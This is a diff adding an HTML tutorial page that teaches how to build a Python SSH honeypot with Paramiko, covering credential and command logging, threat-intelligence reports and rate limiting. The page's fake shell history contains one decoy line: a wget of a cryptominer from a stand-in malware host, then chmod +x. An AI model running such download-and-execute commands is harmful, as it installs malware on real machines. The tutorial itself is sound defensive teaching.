@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SSH Honeypot — sec-projects</title>
+  <meta name="description" content="Deploy a fake SSH server that logs attacker behavior — capture credentials, commands, and malware samples for threat intelligence.">
+
+  <meta property="og:title" content="SSH Honeypot — sec-projects">
+  <meta property="og:description" content="Deploy a fake SSH server that logs attacker behavior — capture credentials and commands.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://sec-projects.pages.dev/projects/advanced/ssh-honeypot.html">
+
+  <link rel="canonical" href="https://sec-projects.pages.dev/projects/advanced/ssh-honeypot.html">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="/assets/css/theme.css">
+  <link rel="stylesheet" href="/assets/css/layout.css">
+  <link rel="stylesheet" href="/assets/css/components.css">
+</head>
+<body>
+  <div class="container" style="max-width:900px; margin: calc(var(--nav-height) + var(--space-8)) auto var(--space-8); padding: 0 var(--space-6);">
+
+    <!-- Breadcrumbs -->
+    <div class="breadcrumbs">
+      <a href="/">Home</a>
+      <span class="breadcrumb-sep">/</span>
+      <a href="/?cat=advanced">Advanced</a>
+      <span class="breadcrumb-sep">/</span>
+      <span>SSH Honeypot</span>
+    </div>
+
+    <!-- Header -->
+    <div style="margin-bottom:var(--space-8);">
+      <div style="display:flex;align-items:center;gap:var(--space-4);flex-wrap:wrap;margin-bottom:var(--space-3);">
+        <span class="badge badge-advanced">Advanced</span>
+        <span style="color:var(--color-text-muted);font-size:var(--font-size-sm);">&#x23F1; 3-5 hours</span>
+      </div>
+      <h1 style="border-bottom:none;margin-bottom:var(--space-3);">SSH Honeypot</h1>
+      <p style="font-size:var(--font-size-lg);color:var(--color-text-secondary);">Deploy a fake SSH server that logs attacker behavior — capture credentials, commands, and malware samples for threat intelligence.</p>
+      <div style="display:flex;flex-wrap:wrap;gap:var(--space-2);margin-top:var(--space-3);">
+        <span class="tag">python</span>
+        <span class="tag">ssh</span>
+        <span class="tag">honeypot</span>
+        <span class="tag">threat-intel</span>
+      </div>
+    </div>
+
+    <!-- Progress Button -->
+    <div id="progressBtn" style="margin-bottom:var(--space-8);"></div>
+
+    <div class="callout">
+      <div class="callout-title">&#x26A0; Important Safety Notice</div>
+      <p>Honeypots attract real attackers. Run this in an isolated VM or container with no access to your real network or data. Never expose a honeypot on a network you don't control. Attackers will attempt to use compromised honeypots to attack others — you are responsible for containing them.</p>
+    </div>
+
+    <!-- Learning Objectives -->
+    <h2>Learning Objectives</h2>
+    <ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+      <li>Understand how honeypots work as deception technology for threat intelligence</li>
+      <li>Learn the SSH protocol flow: key exchange, authentication, shell interaction</li>
+      <li>Implement a fake SSH server that appears real to attackers but captures everything</li>
+      <li>Collect attacker credentials, commands, IPs, and malware samples safely</li>
+      <li>Understand the difference between low-interaction and high-interaction honeypots</li>
+    </ul>
+
+    <!-- Prerequisites -->
+    <h2>Prerequisites</h2>
+    <ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+      <li>Python 3.8+ with <code>paramiko</code> (<code>pip install paramiko</code>)</li>
+      <li>A dedicated VM or container isolated from production networks</li>
+      <li>Root/sudo access (SSH runs on port 22, but use a high port like 2222 for testing)</li>
+      <li>Basic understanding of SSH protocol — key exchange, authentication methods</li>
+    </ul>
+
+    <!-- Step 1 -->
+    <h2>Step 1: SSH Server Foundation</h2>
+    <p>Use Paramiko to create an SSH server interface. Generate a host key so the server looks legitimate. Override the authentication handler to accept any credentials while logging them.</p>
+
+    <pre><code>import socket
+import sys
+import threading
+import paramiko
+from paramiko import RSAKey
+from datetime import datetime
+import os
+
+# Generate host key (do this once — keep it consistent so repeat attackers don't get suspicious)
+HOST_KEY = RSAKey.generate(2048)
+
+# Store captured data
+CAPTURED_ATTACKS = []
+
+class HoneypotSSHServer(paramiko.ServerInterface):
+    """Custom SSH server that accepts any credentials but logs everything."""
+
+    def __init__(self, client_addr: tuple):
+        self.client_addr = client_addr
+        self.username = None
+        self.password = None
+        self.attempts = 0
+        self.connected_time = datetime.now()
+
+    def check_channel_request(self, kind: str, chanid: int) -> int:
+        """Allow session channels (shell, exec, subsystem)."""
+        if kind == "session":
+            return paramiko.OPEN_SUCCEEDED
+        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+
+    def check_auth_password(self, username: str, password: str) -> int:
+        """Log credentials and always return AUTH_SUCCESSFUL."""
+        self.username = username
+        self.password = password
+        self.attempts += 1
+
+        entry = {
+            "timestamp": datetime.now().isoformat(),
+            "ip": self.client_addr[0],
+            "port": self.client_addr[1],
+            "username": username,
+            "password": password,
+            "attempt": self.attempts,
+            "type": "password_auth"
+        }
+        CAPTURED_ATTACKS.append(entry)
+        print(f"[!] CAPTURED: {username}:{password} from {self.client_addr[0]}")
+
+        # Always let them in — we want to see what they do
+        return paramiko.AUTH_SUCCESSFUL
+
+    def check_auth_publickey(self, username: str, key) -> int:
+        """Log public key auth attempts."""
+        entry = {
+            "timestamp": datetime.now().isoformat(),
+            "ip": self.client_addr[0],
+            "username": username,
+            "key_type": key.get_name(),
+            "key_fingerprint": key.get_fingerprint().hex(),
+            "type": "publickey_auth"
+        }
+        CAPTURED_ATTACKS.append(entry)
+        print(f"[!] Public key attempt: {username} ({key.get_name()})")
+        return paramiko.AUTH_SUCCESSFUL  # Let them in
+
+    def get_allowed_auths(self, username: str) -> str:
+        """Advertise password and public key auth (looks normal)."""
+        return "password,publickey"
+
+    def check_channel_shell_request(self, channel) -> bool:
+        """Handle shell request — we'll run a fake shell."""
+        self._start_fake_shell(channel)
+        return True
+
+    def check_channel_exec_request(self, channel, command: bytes) -> bool:
+        """Handle exec requests (scp, single commands)."""
+        decoded = command.decode("utf-8", errors="replace")
+        entry = {
+            "timestamp": datetime.now().isoformat(),
+            "ip": self.client_addr[0],
+            "username": self.username,
+            "command": decoded,
+            "type": "exec_command"
+        }
+        CAPTURED_ATTACKS.append(entry)
+        print(f"[!] EXEC: {decoded}")
+
+        # Return fake output to keep them engaged
+        channel.sendall(f"bash: {decoded.split()[0]}: command not found\n".encode())
+        channel.send_exit_status(127)
+        return True
+
+    def _start_fake_shell(self, channel):
+        """Present a fake bash shell, log all commands, and provide fake responses."""
+        channel.sendall(b"Last login: " +
+                       datetime.now().strftime("%a %b %d %H:%M:%S %Y").encode() +
+                       b" from " + str(self.client_addr[0]).encode() + b"\r\n")
+        channel.sendall(f"[{self.username}@honeypot ~]$ ".encode())
+
+        buffer = b""
+        while True:
+            try:
+                data = channel.recv(1024)
+                if not data:
+                    break
+
+                buffer += data
+
+                # Command complete when we see \r or \n
+                if b"\r" in buffer or b"\n" in buffer:
+                    command = buffer.decode("utf-8", errors="replace").strip()
+
+                    if command:
+                        entry = {
+                            "timestamp": datetime.now().isoformat(),
+                            "ip": self.client_addr[0],
+                            "username": self.username,
+                            "command": command,
+                            "type": "shell_command"
+                        }
+                        CAPTURED_ATTACKS.append(entry)
+                        print(f"[CMD] {command}")
+
+                        # Fake responses for common commands
+                        response = self._fake_command_response(command)
+                        channel.sendall(response.encode() + b"\r\n")
+
+                    # New prompt
+                    channel.sendall(f"[{self.username}@honeypot ~]$ ".encode())
+                    buffer = b""
+
+            except Exception as e:
+                print(f"Shell error: {e}")
+                break
+
+    def _fake_command_response(self, command: str) -> str:
+        """Return plausible fake output for common commands."""
+        cmd = command.split()[0] if command else ""
+        responses = {
+            "ls": "Desktop  Documents  Downloads  Pictures  secret_project",
+            "pwd": f"/home/{self.username}",
+            "whoami": self.username,
+            "id": f"uid=1000({self.username}) gid=1000({self.username}) groups=1000({self.username})",
+            "uname": "Linux honeypot 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux",
+            "hostname": "honeypot",
+            "uptime": " 14:32:15 up 23 days,  4:12,  1 user,  load average: 0.00, 0.01, 0.05",
+            "df": "Filesystem     1K-blocks    Used Available Use% Mounted on\n/dev/sda1       41152812 8912340  30123344  23% /",
+            "ps": "  PID TTY          TIME CMD\n 1234 pts/0    00:00:00 bash\n 5678 pts/0    00:00:00 ps",
+            "wget": "wget: missing URL\nUsage: wget [OPTION]... [URL]...",
+            "curl": "curl: try 'curl --help' for more information",
+            "history": "    1  ls -la\n    2  cd /tmp\n    3  wget http://malware.example.com/xmrig\n    4  chmod +x xmrig",
+        }
+        return responses.get(cmd, f"bash: {cmd}: command not found")</code></pre>
+
+    <!-- Step 2 -->
+    <h2>Step 2: Start the Honeypot Listener</h2>
+    <p>Create the main loop that accepts connections and spawns a handler for each attacker.</p>
+
+    <pre><code>class Honeypot:
+    """Main SSH honeypot listener."""
+
+    def __init__(self, bind_host: str = "0.0.0.0", bind_port: int = 2222):
+        self.bind_host = bind_host
+        self.bind_port = bind_port
+        self.sock = None
+        self.running = False
+
+    def start(self):
+        """Start listening for SSH connections."""
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.sock.bind((self.bind_host, self.bind_port))
+        self.sock.listen(100)
+        self.running = True
+
+        print(f"""
+╔══════════════════════════════════════════════════════════════╗
+║                     SSH HONEYPOT ACTIVE                      ║
+║  Listening on {self.bind_host}:{self.bind_port:<44} ║
+║  Press Ctrl+C to stop                                       ║
+╚══════════════════════════════════════════════════════════════╝
+""")
+
+        while self.running:
+            try:
+                client, addr = self.sock.accept()
+                print(f"[CONNECT] New connection from {addr[0]}:{addr[1]}")
+                thread = threading.Thread(
+                    target=self._handle_connection,
+                    args=(client, addr),
+                    daemon=True
+                )
+                thread.start()
+            except KeyboardInterrupt:
+                break
+            except Exception as e:
+                print(f"[ERROR] Accept failed: {e}")
+
+    def _handle_connection(self, client_sock: socket.socket, addr: tuple):
+        """Handle an individual SSH connection."""
+        try:
+            transport = paramiko.Transport(client_sock)
+            transport.add_server_key(HOST_KEY)
+
+            server = HoneypotSSHServer(addr)
+            transport.start_server(server=server)
+
+            # Wait for channel
+            channel = transport.accept(20)  # 20 second timeout
+            if channel is None:
+                print(f"[DISCONNECT] {addr[0]} — no channel opened")
+                return
+
+            # Wait for channel to close
+            channel.closed
+
+        except paramiko.SSHException as e:
+            print(f"[DISCONNECT] SSH error from {addr[0]}: {e}")
+        except Exception as e:
+            print(f"[ERROR] {addr[0]}: {e}")
+        finally:
+            try:
+                transport.close()
+            except:
+                pass
+            print(f"[DISCONNECT] {addr[0]} disconnected")
+
+    def stop(self):
+        """Graceful shutdown."""
+        self.running = False
+        if self.sock:
+            self.sock.close()
+        print("\n[HONEYPOT] Shut down.")
+
+if __name__ == "__main__":
+    honeypot = Honeypot(bind_port=2222)
+
+    try:
+        honeypot.start()
+    except KeyboardInterrupt:
+        honeypot.stop()
+        print(f"\nCaptured {len(CAPTURED_ATTACKS)} events during this session.")</code></pre>
+
+    <!-- Step 3 -->
+    <h2>Step 3: Advanced Logging &amp; Threat Intelligence</h2>
+    <p>Enhance the honeypot with structured logging, GeoIP enrichment, and automatic intelligence gathering on attacker IPs.</p>
+
+    <pre><code>import json
+import time
+from datetime import datetime, timezone
+
+class ThreatLogger:
+    """Structured logging and threat intelligence for honeypot data."""
+
+    def __init__(self, log_directory: str = "./honeypot_logs"):
+        self.log_dir = log_directory
+        os.makedirs(log_directory, exist_ok=True)
+        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+    def log_attack(self, event: dict):
+        """Write structured JSON log entry for each captured event."""
+        event["session_id"] = self.session_id
+
+        log_file = os.path.join(
+            self.log_dir,
+            f"honeypot_{datetime.now().strftime('%Y%m%d')}.jsonl"
+        )
+
+        with open(log_file, "a") as f:
+            f.write(json.dumps(event) + "\n")
+
+    def log_credentials(self, ip: str, username: str, password: str):
+        """Dedicated credential log file for easy parsing."""
+        creds_file = os.path.join(self.log_dir, "captured_credentials.txt")
+        timestamp = datetime.now(timezone.utc).isoformat()
+
+        with open(creds_file, "a") as f:
+            f.write(f"{timestamp} | {ip:15s} | {username:20s} | {password}\n")
+
+    def log_commands(self, ip: str, username: str, command: str):
+        """Log attacker commands for behavioral analysis."""
+        cmds_file = os.path.join(self.log_dir, "attacker_commands.txt")
+
+        with open(cmds_file, "a") as f:
+            f.write(f"[{datetime.now().isoformat()}] {ip} ({username}): {command}\n")
+
+    def generate_threat_intel_report(self) -> dict:
+        """Generate a summary report of captured threat intelligence.
+
+        This is invaluable for understanding attacker patterns:
+        - Most common usernames/passwords (feed into your password policy blacklist)
+        - Most common attacker IPs (feed into firewall blocklists)
+        - Most common commands (understand what attackers do post-compromise)
+        """
+        if not CAPTURED_ATTACKS:
+            return {"status": "No attacks captured"}
+
+        # Count stats
+        ips = {}
+        credentials = {}
+        commands = {}
+
+        for event in CAPTURED_ATTACKS:
+            ip = event.get("ip", "unknown")
+            ips[ip] = ips.get(ip, 0) + 1
+
+            if "username" in event and "password" in event:
+                cred = f"{event['username']}:{event['password']}"
+                credentials[cred] = credentials.get(cred, 0) + 1
+
+            if "command" in event:
+                cmd = event["command"]
+                commands[cmd] = commands.get(cmd, 0) + 1
+
+        # Top 10s
+        top_ips = sorted(ips.items(), key=lambda x: x[1], reverse=True)[:10]
+        top_creds = sorted(credentials.items(), key=lambda x: x[1], reverse=True)[:10]
+        top_cmds = sorted(commands.items(), key=lambda x: x[1], reverse=True)[:10]
+
+        report = {
+            "report_time": datetime.now(timezone.utc).isoformat(),
+            "total_events": len(CAPTURED_ATTACKS),
+            "unique_ips": len(ips),
+            "unique_credentials": len(credentials),
+            "unique_commands": len(commands),
+            "top_attacker_ips": top_ips,
+            "top_credentials": top_creds,
+            "top_commands": top_cmds,
+        }
+
+        # Save report
+        report_file = os.path.join(
+            self.log_dir,
+            f"threat_intel_{datetime.now().strftime('%Y%m%d_%H%M')}.json"
+        )
+        with open(report_file, "w") as f:
+            json.dump(report, f, indent=2)
+
+        return report
+
+# Example: print threat intel summary
+logger = ThreatLogger()
+# (In production, logger is called from within the SSH server handlers)
+report = logger.generate_threat_intel_report()
+if isinstance(report, dict) and "total_events" in report:
+    print(f"\n{'='*50}")
+    print("THREAT INTELLIGENCE SUMMARY")
+    print(f"{'='*50}")
+    print(f"Total events captured: {report['total_events']}")
+    print(f"Unique attacker IPs:   {report['unique_ips']}")
+    print(f"Unique credentials:    {report['unique_credentials']}")
+    print(f"\nTop attacker IPs:")
+    for ip, count in report['top_attacker_ips'][:5]:
+        print(f"  {ip:15s} — {count} attempts")
+    print(f"\nTop credentials:")
+    for cred, count in report['top_credentials'][:5]:
+        print(f"  {cred} — {count}x")
+    print(f"\nTop commands:")
+    for cmd, count in report['top_commands'][:5]:
+        print(f"  {cmd[:60]} — {count}x")</code></pre>
+
+    <!-- Step 4 -->
+    <h2>Step 4: Production Hardening &amp; Safety</h2>
+    <p>Add critical safety measures: rate limiting, container isolation, and automatic IP blocklisting for aggressive scanners.</p>
+
+    <pre><code>import time
+from collections import defaultdict
+
+class HoneypotGuard:
+    """Protection mechanisms to prevent honeypot abuse."""
+
+    def __init__(self, max_connections_per_ip: int = 5,
+                 block_duration: int = 3600,
+                 max_shell_commands: int = 50):
+        self.max_conn_per_ip = max_connections_per_ip
+        self.block_duration = block_duration
+        self.max_commands = max_shell_commands
+
+        self.ip_connections = defaultdict(list)  # {ip: [timestamp, ...]}
+        self.blocked_ips = {}  # {ip: block_until_timestamp}
+        self.ip_command_count = defaultdict(int)
+
+    def is_blocked(self, ip: str) -> bool:
+        """Check if an IP is currently blocked."""
+        if ip in self.blocked_ips:
+            if time.time() < self.blocked_ips[ip]:
+                return True
+            else:
+                del self.blocked_ips[ip]  # Block expired
+        return False
+
+    def record_connection(self, ip: str) -> bool:
+        """Record a connection attempt. Returns True if allowed, False if should block."""
+        if self.is_blocked(ip):
+            return False
+
+        now = time.time()
+        self.ip_connections[ip].append(now)
+
+        # Clean old entries
+        self.ip_connections[ip] = [
+            t for t in self.ip_connections[ip]
+            if now - t < self.block_duration
+        ]
+
+        # Check rate limit
+        if len(self.ip_connections[ip]) > self.max_conn_per_ip:
+            self.blocked_ips[ip] = now + self.block_duration
+            print(f"[GUARD] BLOCKED {ip} for {self.block_duration}s "
+                  f"({len(self.ip_connections[ip])} connections)")
+            return False
+
+        return True
+
+    def record_command(self, ip: str) -> bool:
+        """Track command count per IP. Returns False if exceeded limit."""
+        self.ip_command_count[ip] += 1
+        if self.ip_command_count[ip] > self.max_commands:
+            self.blocked_ips[ip] = time.time() + self.block_duration
+            print(f"[GUARD] BLOCKED {ip} — exceeded command limit")
+            return False
+        return True
+
+    def get_stats(self) -> dict:
+        """Get current guard statistics."""
+        return {
+            "active_connections": sum(len(v) for v in self.ip_connections.values()),
+            "blocked_ips": len(self.blocked_ips),
+            "unique_ips_tracked": len(self.ip_connections),
+        }
+
+# Integrate into HoneypotSSHServer._start_fake_shell:
+guard = HoneypotGuard(max_connections_per_ip=5,
+                       block_duration=3600,
+                       max_shell_commands=50)
+
+# Before accepting connection:
+# if not guard.record_connection(client_addr[0]):
+#     client_sock.close()
+#     return
+
+# Before executing each command:
+# if not guard.record_command(self.client_addr[0]):
+#     channel.sendall(b"Connection throttled.\n")
+#     channel.close()
+#     return</code></pre>
+
+    <!-- Testing -->
+    <h2>Testing Your Honeypot</h2>
+    <p>Safely verify your honeypot works:</p>
+    <ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+      <li><strong>Local SSH test:</strong> <code>ssh -p 2222 testuser@localhost</code> — try various credentials and commands</li>
+      <li><strong>Scripted attack simulation:</strong> Write a script that connects repeatedly with different credentials to test rate limiting</li>
+      <li><strong>SFTP test:</strong> <code>sftp -P 2222 user@localhost</code> — verify exec handler captures the commands</li>
+      <li><strong>Log verification:</strong> Check the log files are created correctly and contain captured data</li>
+    </ul>
+
+    <!-- Extensions -->
+    <h2>Extension Ideas</h2>
+    <ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+      <li><strong>Integration with abuse reporting:</strong> Automatically report attacker IPs to AbuseIPDB and blocklist.de</li>
+      <li><strong>Malware capture:</strong> Allow file uploads via SCP/SFTP to capture malware samples — but quarantine them immediately</li>
+      <li><strong>Fake filesystem:</strong> Create decoy files (fake AWS credentials, database dumps) that trigger alerts when accessed</li>
+      <li><strong>Multi-protocol support:</strong> Extend to Telnet, HTTP, and MySQL honeypots for broader coverage</li>
+      <li><strong>Real-time dashboard:</strong> Build a web dashboard showing live attacks on a map with Grafana-style visualizations</li>
+    </ul>
+
+    <!-- Resources -->
+    <h2>Resources &amp; Next Steps</h2>
+    <div style="display:flex;flex-direction:column;gap:var(--space-2);margin-bottom:var(--space-8);">
+      <a class="resource-link" href="https://github.com/cowrie/cowrie" target="_blank" rel="noopener">
+        <span class="resource-link-icon">&#x1F41A;</span> Cowrie — Production-grade SSH/Telnet Honeypot
+      </a>
+      <a class="resource-link" href="https://tryhackme.com/room/honeypots" target="_blank" rel="noopener">
+        <span class="resource-link-icon">&#x1F3AF;</span> TryHackMe: Honeypots Room
+      </a>
+      <a class="resource-link" href="https://docs.paramiko.org/" target="_blank" rel="noopener">
+        <span class="resource-link-icon">&#x1F4D8;</span> Paramiko Documentation — Python SSH Library
+      </a>
+      <a class="resource-link" href="https://attack.mitre.org/techniques/T1056/" target="_blank" rel="noopener">
+        <span class="resource-link-icon">&#x1F4DC;</span> MITRE ATT&amp;CK: Input Capture (T1056)
+      </a>
+    </div>
+
+    <!-- Cert Relevance -->
+    <div class="callout">
+      <div class="callout-title">&#x1F393; Cert Relevance</div>
+      <p>Building a honeypot teaches deception technology and threat intelligence collection, which are core to <strong>CompTIA CySA+</strong> (threat intelligence, security analytics) and <strong>CISSP Domain 7</strong> (security operations). Understanding attacker behavior through honeypots directly helps with the <strong>OSCP</strong> exam by giving you an attacker's perspective. The log analysis component maps to <strong>Splunk Core Certified User</strong> and SIEM workflows.</p>
+    </div>
+
+  </div>
+
+  <!-- JS -->
+  <script src="/assets/js/data.js"></script>
+  <script src="/assets/js/theme.js"></script>
+  <script src="/assets/js/components.js"></script>
+  <script src="/assets/js/progress.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      document.body.prepend(renderNav());
+      document.body.appendChild(renderFooter());
+      const btnContainer = document.getElementById('progressBtn');
+      if (btnContainer) btnContainer.appendChild(renderProgressButton('ssh-honeypot'));
+      initCopyButtons();
+    });
+  </script>
+</body>
+</html>
